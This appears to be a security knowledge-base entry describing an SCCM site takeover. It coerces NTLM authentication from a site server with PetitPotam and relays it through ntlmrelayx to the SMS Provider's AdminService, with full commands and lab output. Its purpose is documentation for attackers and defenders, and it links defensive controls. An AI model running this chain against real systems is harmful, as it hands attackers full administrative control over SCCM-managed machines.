# Site Takeover via NTLM Coercion and Relay from Site Server to SMS Provider

## Code Name
- SITETAKEOVER02

## ATT&CK TTPs
- [T1078.002 - Valid Accounts](https://attack.mitre.org/techniques/T1078/002/)
- [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/)

## Required Privilege / Context
Valid domain credentials with network connectivity to the primary site server and SMS Provider.

## Summary

The SMS Provider is a SCCM site server role installed by default on the site server when configuring a primary site or central administration site. The role can optionally be installed on additional SCCM component servers for high availability configurations.  The SMS Provider is a Windows Management Instrumentation (WMI) provider that performs as an intermediary for accessing and modifying data stored in the site database. Access to the SMS Provider is controlled via membership of the the `SMS Admins` local security group on each site server. The site server computer account is a member of the `SMS Admins` security group on each SMS Provider in a site by default.
The SMS Provider also provides access to the site database via the administration service (adminservice) REST API and uses Microsoft Negotiate for authentication. In default configurations, the adminservice is vulnerable to NTLM relay attacks. 

## Impact

This technique may allow an attacker to relay a primary site server machine account to a remote SMS Provider and elevate their privileges to "Full Administrator" for the SCCM Hierarchy. If successful, this technique enables lateral movement to all SCCM clients and/or sensitive systems.

## Examples
- Use SCCMHunter to profile SCCM component server roles
- Use PetitPotam to coerce authentication from primary site server
- Use NTLMrelayx to relay credentials to remote SMS Provider

### SCCMHunter
```
[02:00:25 PM] INFO     [+] Finished profiling all discovered computers.                                   
[02:00:25 PM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                       | Hostname                | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |
                       +=========================+============+=================+==============+===================+=====================+===============+========+=========+
                       | provider.internal.lab   | None       | False           | False        | False             | False               | True          | False  | False   |
                       +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                       | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |
                       +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
```

### PetitPotam

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 sccm.internal.lab

                           
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```

### NTLMRelayx

```
┌──(adminservice)─(root㉿DEKSTOP-2QO0YEUW)-[/opt/adminservice/examples]
└─# python3 ntlmrelayx.py --adminservice --logonname "lab\specter" --displayname "lab\secter" --objectsid "S-1-5-21-2391214593-4168590120-2599633397-1133" -smb2support -t https://provider.internal.lab/AdminService/wmi/SMS_Admin
Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.100.121, attacking target https://provider.internal.lab
[*] Exiting standard auth flow to add SCCM admin...
[*] Authenticating against https://provider.internal.lab as LAB/SCCM$
[*] Skipping user SCCM$ since attack was already performed
[*] Server returned code 201, attack successful

```


## Defensive IDs
- [PROTECT01](../../defense-techniques/PROTECT01/protect01-description.md)
- [PROTECT10](../../defense-techniques/PROTECT10/protect10-description.md)
- [DETECT01](../../defense-techniques/DETECT01/detect01-description.md)


## References
- Garrett Foster, Site Takeover via SCCM’s AdminService API, https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf
- Microsoft, Plan for the SMS Provider, https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-sms-provider
- Microsoft, What is the administration service in Configuration Manager?, https://learn.microsoft.com/en-us/mem/configmgr/develop/adminservice/overview